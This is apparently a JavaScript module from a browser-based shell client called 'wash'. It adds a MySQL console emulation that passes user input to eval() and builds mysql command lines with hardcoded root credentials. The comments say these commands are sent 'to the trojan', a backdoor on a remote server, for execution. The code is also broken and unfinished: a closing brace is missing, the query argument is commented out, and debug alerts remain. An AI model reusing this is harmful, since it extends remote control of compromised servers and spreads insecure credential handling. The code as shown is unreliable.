// Here we pop open the wash object once again to patch in some tailored
// functionality.
wash.mysql = {
    // buffer the database connection parameters
    connection: {
        host     : 'localhost',
        username : 'root',
        password : 'root',
        database : 'chrisallenlane',
    },

    // buffer some objects when changing emulation modes
    old_objects: {
        prompt          : '',
        process_command : '',
    },

    // this will begin an emulation of a mysql terminal
    connect: function(connection_parameters){
        // visually signify that we're entering an emulated session
        $('body').animate({ backgroundColor : '#E97B00' }, 500);
        shell.status.set('Emulating mysql client.');

        // buffer the previous session's settings
        wash.mysql.old_objects.prompt = shell.prompt.context.get();
        shell.prompt.context.set('mysql>');

        // buffer the previous process command - this is where the real "magic"
        // happens that makes this work
        wash.mysql.old_objects.process_command = wash.process; 

        // now, write a new function to process commands
        wash.process = function(command){
            // parse out the wash action
            if(shell.prompt.mode.get() == 'wash'){
                // process wash commands as pure JavaScript. This allows for
                // tremendous extensibility
                try{
                    eval(command);
                }catch(e){
                    shell.output.write('wash error: Invalid command.', 'output wash_error');
                }
            }
            
            // if the prompt is not in wash mode, default to mysql action
            else {
                console.log('blah');
                // emulate the mysql console just by running queries through the 
                // command line
                var cmd = '';
                cmd += "mysql -h'localhost' "; 
                cmd += "-u'root' "; 
                cmd += "-p'root' "; 
                cmd += "chrisallenlane "; 
                //cmd += "-e \"" + command + "\"; 

                alert(cmd);

                // fire the command off to the trojan
                wash.action = 'shell';
                wash.cmd    = cmd;
                wash.send_and_receive();
            }
    },

    // disconnects from the terminal emulation
    disconnect: function(){
        $('body').animate({ backgroundColor : '#708090' }, 500);
        shell.status.set('Terminating mysql emulation.');
        shell.prompt.context.set(wash.mysql.old_objects.prompt);
    },

    dump: function(){

    },

}
